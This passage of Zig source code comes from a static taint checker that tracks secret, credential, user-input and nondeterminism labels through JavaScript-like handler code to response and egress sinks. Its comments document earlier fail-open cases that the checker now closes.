    ///
    /// A read from mutable module state is the second, and it cannot be read
    /// off the capabilities. `sqlOne` declares `.sqlite` and `.policy_check`
    /// and no clock, yet the row it returns is whatever the last write left
    /// there, so a handler embedding that row in its response was proving
    /// `deterministic` while its answer moved under it. `cacheStats` was caught
    /// only by accident: `zttp:cache` declared `.clock` at module level for the
    /// expiry checks in `cacheGet`, and tightening the rows to what each export
    /// really reaches removed the coincidence and exposed the same hole.
    ///
    /// `stateful` and a `.read` effect is the precise test for "another request
    /// could have written what this returns". It selects `cacheGet`,
    /// `cacheStats`, `sqlOne`, `sqlMany`, `getWebSockets`, and
    /// `deserializeAttachment`, and it excludes `zttp:validate`, whose state is
    /// a schema registry the handler compiles from literals in its own run.
    fn exportReadsVaryingSource(
        binding: *const mb.ModuleBinding,
        func: *const mb.FunctionBinding,
    ) bool {
        if (binding.stateful and func.effect == .read) return true;

        const caps = func.required_capabilities orelse binding.required_capabilities;
        for (caps) |cap| {
            if (cap == .clock or cap == .random) return true;
        }
        return false;
    }

    fn scanImports(self: *FlowChecker) void {
        const facts = self.resolveFacts() orelse return;
        for (facts.imports.items) |rec| {
            if (rec.resolution != .builtin) continue;
            const entry = builtin_modules.findExport(rec.module_specifier, rec.imported_name) orelse continue;

            // A value produced by an export that reads a clock, draws
            // randomness, or reads mutable module state differs between runs of
            // the same request. The capability half is seeded from the export's
            // own set rather than declared on each binding, so it tracks the
            // per-export rows automatically: `jwtVerify` carries it and
            // `parseBearer` does not, because only one of them declares
            // `.clock`.
            var labels = entry.func.return_labels;
            if (exportReadsVaryingSource(entry.binding, entry.func)) labels.nondeterministic = true;

            if (!labels.isEmpty()) {
                self.module_fn_labels.put(
                    self.allocator,
                    rec.slot,
                    labels,
                ) catch self.markAllocationFailure();
            }
            self.module_fn_meta.put(
                self.allocator,
                rec.slot,
                .{
                    .module = entry.binding.name,
                    .func = entry.func.name,
                    .returns = entry.func.returns,
                },
            ) catch self.markAllocationFailure();
            if (entry.func.derives_from_args) {
                self.module_fn_arg_derived.put(self.allocator, rec.slot, {}) catch
                    self.markAllocationFailure();
            }
            // Matched on the imported name, not the local alias, exactly as
            // before: `import { env as e }` still sets this slot.
            if (std.mem.eql(u8, rec.imported_name, "env")) {
                self.env_fn_slot = rec.slot;
            }
        }
    }

    /// Index user function declarations (and function-valued const/let
    /// bindings) so call-label inference can summarize callee bodies instead
    /// of dropping labels at every user-defined call boundary.
    fn scanFunctionDecls(self: *FlowChecker) void {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .function_decl and tag != .var_decl) continue;

            // function_decl shares the var_decl layout: binding + init
            // function expression.
            const vd = self.ir_view.getVarDecl(idx) orelse continue;
            if (vd.init == null_node) continue;
            if (tag == .var_decl) {
                const init_tag = self.ir_view.getTag(vd.init) orelse continue;
                if (init_tag != .function_expr and init_tag != .arrow_function) continue;
            }
            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
            self.user_fn_decls.put(self.allocator, key, vd.init) catch self.markAllocationFailure();
        }
    }

    fn findHandlerParam(self: *FlowChecker, handler_func: NodeIndex) void {
        const func = self.ir_view.getFunction(handler_func) orelse return;
        if (func.params_count == 0) return;

        // First parameter is the request object. The parser wraps every
        // function parameter in a `.pattern_element`, even for the simple
        // `function handler(req)` case; drill through to the binding.
        const param_idx = self.ir_view.getListIndex(func.params_start, 0);
        const binding = self.paramBinding(param_idx) orelse return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        self.req_binding_key = key;
        // Request parameter carries user_input label
        self.binding_labels.put(self.allocator, key, .{ .user_input = true }) catch self.markAllocationFailure();
    }

    /// Unwrap a function parameter node to its binding slot. Handles both
    /// the bare `.identifier` shape and the `.pattern_element` wrapper the
    /// parser emits for every parameter.
    fn paramBinding(self: *const FlowChecker, param_idx: NodeIndex) ?ir.BindingRef {
        return self.ir_view.paramBinding(param_idx);
    }

    /// Walk a (possibly nested) member-access assignment target down to its root
    /// identifier binding, so `obj.field = secret` / `obj.a.b = secret` taints
    /// the base object rather than dropping the label entirely.
    /// Propagate the labels of an assignment's value onto the binding it
    /// writes. Reached both from a statement-position assignment (via
    /// `expr_stmt`) and from a bare `.assignment` statement node.
    fn applyAssignmentLabels(self: *FlowChecker, node: NodeIndex) void {
        const asgn = self.ir_view.getAssignment(node) orelse return;
        const labels = self.inferLabels(asgn.value);
        const target_tag = self.ir_view.getTag(asgn.target) orelse return;
        if (target_tag == .identifier) {
            const binding = self.ir_view.getBinding(asgn.target) orelse return;
            const key = packBindingKey(binding.scope_id, binding.slot);
            if (asgn.op) |_| {
                // Compound assignment (+=, etc): merge with existing
                const existing = self.binding_labels.get(key) orelse LabelSet.empty;
                self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, labels)) catch self.markAllocationFailure();
            } else {
                // Simple assignment: replace
                self.binding_labels.put(self.allocator, key, labels) catch self.markAllocationFailure();
            }
            self.recordBindingValue(binding, asgn.value);
        } else if (target_tag == .member_access or target_tag == .optional_chain or target_tag == .computed_access) {
            // `obj.field = secret` / `obj[k] = secret`: taint the base object so
            // a later read of `obj` keeps the label. Merge rather than replace,
            // since other fields may already taint it.
            if (labels.isEmpty()) return;
            const binding = self.assignmentRootBinding(asgn.target) orelse return;
            const key = packBindingKey(binding.scope_id, binding.slot);
            const existing = self.binding_labels.get(key) orelse LabelSet.empty;
            self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, labels)) catch self.markAllocationFailure();
        }
    }

    fn assignmentRootBinding(self: *const FlowChecker, target: NodeIndex) ?ir.BindingRef {
        var node = target;
        while (true) {
            const tag = self.ir_view.getTag(node) orelse return null;
            switch (tag) {
                .identifier => return self.ir_view.getBinding(node),
                .member_access, .optional_chain, .computed_access => {
                    const member = self.ir_view.getMember(node) orelse return null;
                    node = member.object;
                },
                // exhaustive: null means the target has no root identifier to
                // taint - an assignment to a call result or a literal, which
                // binds nothing the checker tracks. Every target shape that
                // does reach a binding is walked above.
                else => return null,
            }
        }
    }

    /// Propagate argument taint of a mutating array method back onto the
    /// receiver binding: `arr.push(secret)` taints `arr`, so a later
    /// `return { arr }` is caught. Mirrors the member-assignment taint
    /// propagation for `obj.field = secret`.
    fn propagateMutatingMethodTaint(self: *FlowChecker, expr: NodeIndex) void {
        const tag = self.ir_view.getTag(expr) orelse return;
        if (tag != .call and tag != .method_call) return;
        const call_data = self.ir_view.getCall(expr) orelse return;
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return;
        if (callee_tag != .member_access and callee_tag != .optional_chain) return;
        const member = self.ir_view.getMember(call_data.callee) orelse return;
        const method = self.resolveAtomName(member.property) orelse return;
        const mutating = std.mem.eql(u8, method, "push") or
            std.mem.eql(u8, method, "unshift") or
            std.mem.eql(u8, method, "splice");
        if (!mutating) return;
        // Receiver must be a plain identifier binding.
        if (self.ir_view.getTag(member.object) != .identifier) return;
        const binding = self.ir_view.getBinding(member.object) orelse return;
        var arg_labels = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            arg_labels = LabelSet.merge(arg_labels, self.inferLabels(arg));
        }
        if (arg_labels.isEmpty()) return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const existing = self.binding_labels.get(key) orelse LabelSet.empty;
        self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, arg_labels)) catch self.markAllocationFailure();
    }

    /// Record a defining value node for a binding so the response-sink check
    /// can resolve returned identifiers. Every value is kept (not just the
    /// last) so a tainted branch assignment is still found when a later
    /// branch overwrites the labels.
    fn recordBindingValue(self: *FlowChecker, binding: ir.BindingRef, value: NodeIndex) void {
        if (value == null_node) return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const gop = self.binding_value_nodes.getOrPut(self.allocator, key) catch {
            self.markAllocationFailure();
            return;
        };
        if (!gop.found_existing) gop.value_ptr.* = .empty;
        gop.value_ptr.append(self.allocator, value) catch self.markAllocationFailure();
    }

    fn walkStmt(self: *FlowChecker, node: NodeIndex) void {
        if (node == null_node) return;
        const tag = self.ir_view.getTag(node) orelse return;

        switch (tag) {
            .program, .block => {
                const block = self.ir_view.getBlock(node) orelse return;
                for (0..block.stmts_count) |i| {
                    const stmt_idx = self.ir_view.getListIndex(block.stmts_start, @intCast(i));
                    self.walkStmt(stmt_idx);
                }
            },

            .if_stmt => {
                const if_s = self.ir_view.getIfStmt(node) orelse return;

                // Both `working_constraints` and `working_io_calls` are
                // path-scoped: entering a branch extends them, leaving
                // restores them. Without the io_calls restore, calls made
                // in a sibling branch would appear in the witness for this
                // one, so the synthesised stub sequence would no longer
                // drive the handler down the path that actually witnesses
                // the sink.
                const saved_io = self.working_io_calls.items.len;
                const then_pushed = self.pushConditionConstraints(if_s.condition, false);
                self.walkStmt(if_s.then_branch);
                self.popConstraints(then_pushed);
                self.working_io_calls.shrinkRetainingCapacity(saved_io);

                if (if_s.else_branch != null_node) {
                    const else_pushed = self.pushConditionConstraints(if_s.condition, true);
                    self.walkStmt(if_s.else_branch);
                    self.popConstraints(else_pushed);
                    self.working_io_calls.shrinkRetainingCapacity(saved_io);
                }
            },

            .var_decl => {
                const vd = self.ir_view.getVarDecl(node) orelse return;
                if (vd.init != null_node) {
                    const labels = self.inferLabels(vd.init);
                    if (!labels.isEmpty()) {
                        const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
                        self.binding_labels.put(self.allocator, key, labels) catch self.markAllocationFailure();
                    }
                    self.recordBindingValue(vd.binding, vd.init);
                    self.trackModuleCallInit(vd);
                    // Track result bindings from validation calls for .value label narrowing
                    self.trackResultBinding(vd);
                    // Egress/console/log sink checks must also run when the call's
                    // result is bound (`const r = fetch(url, { body: secret })`),
                    // not only on bare-statement calls. checkExprSinks self-guards
                    // to a no-op for any initializer that is not such a call.
                    self.checkExprSinks(vd.init);
                }
            },

            .assignment => self.applyAssignmentLabels(node),

            .return_stmt => {
                if (self.ir_view.getOptValue(node)) |ret_val| {
                    if (self.summary_returns) |acc| {
                        acc.* = LabelSet.merge(acc.*, self.inferLabels(ret_val));
                    } else {
                        // Check if returning data via Response helpers
                        self.checkResponseSink(ret_val);
                    }
                }
            },

            .expr_stmt => {
                if (self.ir_view.getOptValue(node)) |expr| {
                    self.checkExprSinks(expr);
                    self.propagateMutatingMethodTaint(expr);
                    // An assignment written as a statement (`obj.field = secret;`)
                    // parses as an expr_stmt wrapping the assignment, so the
                    // `.assignment` arm below never sees it. Without this the
                    // label update never ran for the ordinary form.
                    if (self.ir_view.getTag(expr) == .assignment) self.applyAssignmentLabels(expr);
                }
            },

            .for_of_stmt, .for_in_stmt => {
                const fi = self.ir_view.getForIter(node) orelse return;
                // Iteration variable inherits labels from iterable
                const iterable_labels = self.inferLabels(fi.iterable);
                if (!iterable_labels.isEmpty()) {
                    const key = packBindingKey(fi.binding.scope_id, fi.binding.slot);
                    self.binding_labels.put(self.allocator, key, iterable_labels) catch self.markAllocationFailure();
                }
                self.walkStmt(fi.body);
            },

            .switch_stmt => {
                const sw = self.ir_view.getSwitchStmt(node) orelse return;
                for (0..sw.cases_count) |i| {
                    const case_idx = self.ir_view.getListIndex(sw.cases_start, @intCast(i));
                    const cc = self.ir_view.getCaseClause(case_idx) orelse continue;
                    for (0..cc.body_count) |j| {
                        const body_stmt = self.ir_view.getListIndex(cc.body_start, @intCast(j));
                        self.walkStmt(body_stmt);
                    }
                }
            },

            .function_decl, .function_expr, .arrow_function => {
                // While summarizing a callee, a nested function's returns are
                // not the callee's returns; skip its body.
                if (self.summary_returns != null) return;
                const func = self.ir_view.getFunction(node) orelse return;
                self.walkStmt(func.body);
            },

            .export_default => {
                if (self.ir_view.getOptValue(node)) |val| {
                    self.walkStmt(val);
                }
            },

            .call, .method_call => {
                self.checkExprSinks(node);
            },

            .assert_stmt => {
                const assert = self.ir_view.getAssertStmt(node) orelse return;
                if (assert.error_expr != null_node) {
                    self.checkExprSinks(assert.error_expr);
                }
            },

            // exhaustive: every statement kind that holds an expression which
            // can reach a sink, bind a label, or contain further statements is
            // handled above, including program/block and if_stmt at the top of
            // this switch. The rest carry no expression to check.
            else => {},
        }
    }

    /// Labels a value carries. The empty set is a claim - "this carries
    /// nothing" - so an arm that returns it because the walk could not look is
    /// a fail-open, and five of those shipped before anyone noticed. Reading
    /// the arms is how they were missed; running a handler through each
    /// position is how they were found.
    ///
    /// Every position that can hold a value was probed with a handler that
    /// launders `env("SECRET_KEY")` through it into the response. Result, so
    /// the next pass does not re-derive it:
    ///
    ///   carried:      binary and template concatenation, ternary, match arms,
    ///                 member and computed reads, optional chains,
    ///                 assignment, array and object literals, object spread,
    ///                 array and object destructuring, for-of bindings, array
    ///                 HOFs, JSX trees and expression containers, user calls,
    ///                 imported-file calls, closures, callbacks a module
    ///                 invokes, and the pipe operator
    ///   unreachable:  object methods and getters and setters (rejected at
    ///                 parse, with a property holding an arrow suggested
    ///                 instead, which is carried), spread in a call argument
    ///                 (arity is checked before expansion, so it does not type
    ///                 check), sequence and comma expressions (a tag and an
    ///                 `ir.zig` arm exist, no parser path emits them), await
    ///                 and yield (not in the subset)
    ///
    /// Adding an expression kind means probing it, not reasoning about it.
    fn inferLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        if (node == null_node) return LabelSet.empty;
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;

        switch (tag) {
            .lit_int, .lit_float, .lit_string, .lit_bool, .lit_undefined => return LabelSet.empty,

            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return LabelSet.empty;
                const key = packBindingKey(binding.scope_id, binding.slot);
                return self.binding_labels.get(key) orelse LabelSet.empty;
            },

            .call => {
                const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                return self.inferCallLabels(call_data);
            },

            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return LabelSet.empty;
                return LabelSet.merge(self.inferLabels(bin.left), self.inferLabels(bin.right));
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return LabelSet.empty;
                return LabelSet.merge(
                    self.inferLabels(t.condition),
                    LabelSet.mergeConditional(self.inferLabels(t.then_branch), self.inferLabels(t.else_branch)),
                );
            },

            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return LabelSet.empty;
                var labels = self.inferLabels(member.object);

                // req.headers.authorization carries credential label
                if (self.isReqProperty(member.object, "headers")) {
                    const prop_name = self.resolveAtomName(member.property) orelse return labels;
                    if (std.mem.eql(u8, prop_name, "authorization")) {
                        return LabelSet.merge(labels, .{ .credential = true });
                    }
                }

                // result.value inherits labels from the producing validation call
                const prop_name = self.resolveAtomName(member.property) orelse return labels;
                if (std.mem.eql(u8, prop_name, "value")) {
                    const obj_tag = self.ir_view.getTag(member.object) orelse return labels;
                    if (obj_tag == .identifier) {
                        const binding = self.ir_view.getBinding(member.object) orelse return labels;
                        const key = packBindingKey(binding.scope_id, binding.slot);
                        if (self.result_binding_labels.get(key)) |result_labels| {
                            labels = LabelSet.merge(labels, result_labels);
                        }
                    }
                }

                // External labels: merge if the property name matches a declared field
                if (self.external_labels.get(prop_name)) |ext_labels| {
                    labels = LabelSet.merge(labels, ext_labels);
                }

                return labels;
            },

            .computed_access => {
                const member = self.ir_view.getMember(node) orelse return LabelSet.empty;
                const labels = self.inferLabels(member.object);
                // req.headers["authorization"] is the dominant header-read idiom
                // and carries the credential label, mirroring the dot-access form.
                if (self.isReqProperty(member.object, "headers")) {
                    if (self.ir_view.getTag(member.computed) == .lit_string) {
                        if (self.ir_view.getStringIdx(member.computed)) |str_idx| {
                            if (self.ir_view.getString(str_idx)) |key| {
                                if (std.ascii.eqlIgnoreCase(key, "authorization")) {
                                    return LabelSet.merge(labels, .{ .credential = true });
                                }
                            }
                        }
                    }
                }
                return labels;
            },

            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        labels = LabelSet.merge(labels, self.inferLabels(prop.value));
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| {
                            labels = LabelSet.merge(labels, self.inferLabels(val));
                        }
                    }
                }
                return labels;
            },

            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem_idx = self.ir_view.getListIndex(arr.elements_start, i);
                    labels = LabelSet.merge(labels, self.inferLabels(elem_idx));
                }
                return labels;
            },

            .spread => {
                if (self.ir_view.getOptValue(node)) |operand| {
                    return self.inferLabels(operand);
                }
                return LabelSet.empty;
            },

            .match_expr => {
                const match_data = self.ir_view.getMatchExpr(node) orelse return LabelSet.empty;
                var labels = self.inferLabels(match_data.discriminant);
                var i: u8 = 0;
                while (i < match_data.arms_count) : (i += 1) {
                    const arm_idx = self.ir_view.getListIndex(match_data.arms_start, i);
                    const arm = self.ir_view.getMatchArm(arm_idx) orelse continue;
                    labels = LabelSet.merge(labels, self.inferLabels(arm.body));
                }
                return labels;
            },

            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return LabelSet.empty;
                return self.inferLabels(asgn.value);
            },

            .unary_op => {
                if (self.ir_view.getOptValue(node)) |operand| {
                    return self.inferLabels(operand);
                }
                return LabelSet.empty;
            },

            .method_call => {
                const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                var labels = self.inferLabels(call_data.callee);
                for (0..call_data.args_count) |i| {
                    const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                    labels = LabelSet.merge(labels, self.inferLabels(arg));
                }
                return labels;
            },

            // A closure passed as a value carries what calling it would
            // produce. Without this arm `["a"].map(() => env("SECRET_KEY"))`
            // unions an empty set for the callback and the secret rides out in
            // the mapped array with no_secret_leakage still proven. A module
            // export answers from its declared labels before any argument is
            // unioned, so `step("k", () => Date.now())` is unaffected: the
            // recorded-and-replayed read stays deterministic.
            .arrow_function, .function_expr => return self.closureResultLabels(node),

            // exhaustive: the empty set here means "carries no label", and the
            // arms above cover every expression that can hold one - literals,
            // identifiers, calls, operators, both literal containers, member and
            // computed reads, templates, match, spread, and lowered `h` calls.
            // A new
            // expression kind would land here silently, so adding one means
            // visiting this arm.
            else => return LabelSet.empty,
        }
    }

    /// Labels for a call to an export that builds its return value out of its
    /// arguments: the parsing, decoding, and escaping family, which the
    /// registry marks by declaring `validated`.
    ///
    /// The declared set on its own is a fail-open. `validateJson("s", x)`
    /// answered `{validated}` and nothing more, so every other label the
    /// argument carried was dropped, and a secret routed through it reached the
    /// response with `no_secret_leakage` still PROVEN. The same held for
    /// `coerceJson` and `decodeJson` - three exports across two modules, which
    /// is what makes this a rule about a shape rather than a bug in one row.
    ///
    /// The rule: such an export discharges exactly one label, `user_input`,
    /// because that is what validating a value means. Every other label the
    /// input carried survives it. An escaped secret is still a secret and a
    /// parsed credential is still a credential - the same reasoning the
    /// `renderToString` arm below already applies to escaping.
    fn parsedResultLabels(self: *FlowChecker, base: LabelSet, call_data: Node.CallExpr) LabelSet {
        var labels = self.argDerivedLabels(base, call_data);
        // Cleared after the union, not before: the argument is normally the
        // thing carrying `user_input`, and clearing first would let the merge
        // put it straight back.
        labels.user_input = false;
        return labels;
    }

    /// Labels for a call to an export declaring `derives_from_args`: its result
    /// can contain what an argument carried, and it validates nothing, so every
    /// label survives it. This is `parsedResultLabels` without the discharge -
    /// the two differ by exactly the claim `.validated` makes.
    ///
    /// Without this an export declaring no labels answers the empty set, and a
    /// secret through `dictSet` and back out of `dictGet` reached the response
    /// with `no_secret_leakage` PROVEN.
    fn argDerivedLabels(self: *FlowChecker, base: LabelSet, call_data: Node.CallExpr) LabelSet {
        var labels = base;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            labels = LabelSet.merge(labels, self.inferLabels(arg));
        }
        return labels;
    }

    /// Infer labels for a function call expression.
    fn inferCallLabels(self: *FlowChecker, call_data: Node.CallExpr) LabelSet {
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return LabelSet.empty;

        if (callee_tag == .identifier) {
            const binding = self.ir_view.getBinding(call_data.callee) orelse return LabelSet.empty;

            if (self.module_fn_labels.get(binding.slot)) |base_labels| {
                if (self.env_fn_slot != null and binding.slot == self.env_fn_slot.? and call_data.args_count > 0) {
                    const arg = self.ir_view.getListIndex(call_data.args_start, 0);
                    return self.refineEnvLabels(arg, base_labels);
                }
                if (base_labels.validated) return self.parsedResultLabels(base_labels, call_data);
                if (self.module_fn_arg_derived.contains(binding.slot)) {
                    return self.argDerivedLabels(base_labels, call_data);
                }
                return LabelSet.merge(base_labels, self.closureArgLabels(binding.slot, call_data));
            }

            // Declared no labels of its own, but its result carries whatever
            // its arguments did. Must precede the meta branch below, which
            // answers with the closure labels alone.
            if (self.module_fn_arg_derived.contains(binding.slot)) {
                return self.argDerivedLabels(LabelSet.empty, call_data);
            }

            // A builtin module export with no labels to store above: the empty
            // set is its declared answer, not a gap in the walk. `scanImports`
            // records every builtin import here, including those, so this must
            // precede the user-function summary - which has no body for an
            // import and would otherwise report the value untraceable.
            // Carries whatever a callback it invokes returns, and nothing else:
            // the empty declared set is the export's own answer, not a gap.
            // `step` is the case that matters - it declares no labels at all,
            // so without this a secret read inside its callback would arrive
            // unlabelled while the same read inside `parallel`'s callback,
            // which does declare labels, would not.
            if (self.module_fn_meta.contains(binding.slot)) {
                return self.closureArgLabels(binding.slot, call_data);
            }

            // renderToString(jsx) auto-escapes its output, so a user_input value
            // interpolated into the JSX and sent via Response.html is HTML-safe
            // (defended). Model it as `.validated` so the XSS check does not warn.
            // Escaping does NOT hide a secret/credential, so those labels still
            // propagate through the argument union and fire their sink diagnostics.
            if (self.isRenderToStringCall(call_data.callee)) {
                var labels = LabelSet{ .validated = true };
                for (0..call_data.args_count) |i| {
                    const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                    labels = LabelSet.merge(labels, self.inferLabels(arg));
                }
                return labels;
            }

            // User-defined function call: summarize the callee body when its
            // declaration is visible; otherwise keep the union of argument
            // labels. Returning empty here would launder taint through any
            // wrapper function.
            return self.userCallLabels(binding, call_data);
        }

        // req.headers.get("authorization") carries the credential label, like
        // the dot/computed header-read forms. Must precede the generic union
        // below: the union would return req's user_input label instead of the
        // credential label for this exact shape.
        if (callee_tag == .member_access and self.isAuthHeaderGet(call_data)) {
            return .{ .credential = true };
        }

        // `Date.now()` and `Math.random()` are global member calls rather than
        // module imports, so `scanImports` has no binding to hang a label on
        // and the union below would return the empty set for them. Label the
        // read itself: the value then follows the same path as a clock-reading
        // module export, and reaching the response costs `deterministic` while
        // reaching only a log does not.
        if (callee_tag == .member_access and self.isVaryingGlobalRead(call_data.callee)) {
            return .{ .nondeterministic = true };
        }

        // Any other callee shape (member `obj.method(x)`, computed `obj[k](x)`,
        // a call result `f()(x)`, or an IIFE) is not a known
        // pure builtin. Returning empty here would LAUNDER taint: a labelled
        // value routed through `JSON.stringify(secret)`, `[secret].join()`,
        // `secret.slice()`, etc. would reach a sink carrying no label, falsely
        // discharging no_secret_leakage / no_credential_leakage / injection_safe
        // / pii_contained. Fail closed with the conservative union of the
        // callee/receiver labels and every argument's labels (the same merge the
        // never-emitted `.method_call` arm computes). This only adds labels when
        // the receiver or an argument is genuinely tainted, so benign method
        // calls on untainted data stay clean.
        var labels = self.inferLabels(call_data.callee);
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            labels = LabelSet.merge(labels, self.inferLabels(arg));
        }
        return labels;
    }

    /// True for `req.headers.get("authorization")` (case-insensitive header
    /// name): callee is `req.headers.get` and the first argument is the literal
    /// "authorization".
    fn isAuthHeaderGet(self: *const FlowChecker, call_data: Node.CallExpr) bool {
        const member = self.ir_view.getMember(call_data.callee) orelse return false;
        const prop_name = self.resolveAtomName(member.property) orelse return false;
        if (!std.mem.eql(u8, prop_name, "get")) return false;
        if (!self.isReqProperty(member.object, "headers")) return false;
        if (call_data.args_count == 0) return false;
        const arg = self.ir_view.getListIndex(call_data.args_start, 0);
        if (self.ir_view.getTag(arg) != .lit_string) return false;
        const str_idx = self.ir_view.getStringIdx(arg) orelse return false;
        const key = self.ir_view.getString(str_idx) orelse return false;
        return std.ascii.eqlIgnoreCase(key, "authorization");
    }

    /// Labels for a call to a user-defined function: seed the callee's
    /// parameters with the argument labels, walk its body with sink checks
    /// suppressed, and union the labels of every return value. Falls back to
    /// the union of argument labels when the body is unavailable, recursive,
    /// or beyond the summary caps.
    fn userCallLabels(self: *FlowChecker, binding: ir.BindingRef, call_data: Node.CallExpr) LabelSet {
        var arg_labels: [max_summary_params]LabelSet = @splat(LabelSet.empty);
        var arg_union = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            const labels = self.inferLabels(arg);
            if (i < max_summary_params) arg_labels[i] = labels;
            arg_union = LabelSet.merge(arg_union, labels);
        }

        // Every exit below that does not read the callee's body returns the
        // argument union, which for a zero-argument call is the empty set - and
        // the empty set is the positive claim that the value carries nothing.
        // A secret returned by a helper the walk could not enter would reach a
        // sink unlabelled and falsely discharge no_secret_leakage, so those
        // exits carry `.unknown` and the sink clears what it governs instead.
        const unresolved = LabelSet.merge(arg_union, .{ .unknown = true });

        const fn_key = packBindingKey(binding.scope_id, binding.slot);
        const fn_node = self.user_fn_decls.get(fn_key) orelse {
            // An implicit global is a builtin - `h`, `range`, `renderToString`
            // - whose body is not in this module to walk and which launders
            // nothing on its own. Any other binding without a declaration is a
            // call through a value: a callback parameter, or an import the
            // resolver did not follow.
            if (binding.kind == .undeclared_global) return arg_union;
            // A function imported from another file, whose return labels the
            // caller computed from that file and installed here. Unioned with
            // the arguments rather than replacing them, because those labels
            // were computed with the parameters left unlabelled.
            if (self.file_fn_labels.get(binding.slot)) |imported| {
                return LabelSet.merge(arg_union, imported);
            }
            return unresolved;
        };
        if (self.summary_depth >= max_summary_depth) return unresolved;
        for (self.summary_stack[0..self.summary_depth]) |active| {
            // Recursion, and the only exit that stays with the argument union.
            // The value this call produces is one of the callee's returns, and
            // the frame already on the stack for that same function collects
            // every one of them, so nothing is lost by stopping here.
            if (active == fn_key) return arg_union;
        }
        const func = self.ir_view.getFunction(fn_node) orelse return unresolved;
        // Past the parameter cap the arguments cannot be bound, so the body
        // would read every parameter as unlabelled and launder its arguments.
        if (func.params_count > max_summary_params) return unresolved;

        for (0..func.params_count) |i| {
            const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
            const pb = self.paramBinding(param_idx) orelse continue;
            const key = packBindingKey(pb.scope_id, pb.slot);
            const labels = if (i < call_data.args_count) arg_labels[i] else LabelSet.empty;
            self.binding_labels.put(self.allocator, key, labels) catch {
                self.markAllocationFailure();
                return unresolved;
            };
        }

        self.summary_stack[self.summary_depth] = fn_key;
        self.summary_depth += 1;
        defer self.summary_depth -= 1;

        const body_tag = self.ir_view.getTag(func.body) orelse return unresolved;
        // A concise arrow body (`(x) => x`) is stored as a `.return_stmt`
        // wrapping the expression, not the bare expression, so it must go
        // through the same returns-collector as a block/program body. Routing
        // it to the `inferLabels(func.body)` fallback below would infer labels
        // on the return_stmt node (unhandled -> empty), laundering any taint
        // through a const-bound arrow wrapper and falsely proving
        // no_secret_leakage.
        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
            var collected = LabelSet.empty;
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            return collected;
        }
        // Arrow expression body: the body is the return expression.
        return self.inferLabels(func.body);
    }

    fn checkResponseSink(self: *FlowChecker, ret_val: NodeIndex) void {
        var visited: [response_resolve_limit]u32 = undefined;
        var visited_len: usize = 0;
        if (!self.checkResponseValue(ret_val, &visited, &visited_len)) {
            // No Response-helper call shape was reachable for this return
            // value; run a label-only response-sink check so taint cannot
            // ride out through a binding the resolver could not follow.
            self.checkSinkLabels(self.inferLabels(ret_val), ret_val, .response);
        }
    }

    /// Run the response-sink checks on a returned value, resolving through
    /// ternary arms and locally recorded binding values. Returns true when
    /// every reachable shape ended at a Response-helper call that was
    /// sink-checked; false tells the caller to fall back to a label-only
    /// check on the original return value.
    fn checkResponseValue(
        self: *FlowChecker,
        node: NodeIndex,
        visited: *[response_resolve_limit]u32,
        visited_len: *usize,
    ) bool {
        if (node == null_node) return false;
        const tag = self.ir_view.getTag(node) orelse return false;

        switch (tag) {
            // Response.json(data), Response.text(data), Response.html(data), Response.redirect(url)
            .method_call, .call => {
                const call_data = self.ir_view.getCall(node) orelse return false;
                if (!self.isResponseHelper(call_data.callee)) return false;

                // Only the first argument is sink-checked, and that matches
                // what leaves the process: `Response.json/text/html` read the
                // second argument for `status` alone (see `http.zig`), so a
                // value placed in `{ headers: ... }` is dropped rather than
                // transmitted. If those helpers ever honor custom headers, the
                // init argument becomes a response sink and has to be checked
                // here in the same change - otherwise a secret in a header
                // would discharge no_secret_leakage.
                if (call_data.args_count > 0) {
                    const data_arg = self.ir_view.getListIndex(call_data.args_start, 0);
                    const labels = self.inferLabels(data_arg);
                    self.checkSinkLabels(labels, node, .response);

                    // XSS check: Response.html with unvalidated user input
                    if (labels.has(.user_input) and !labels.has(.validated)) {
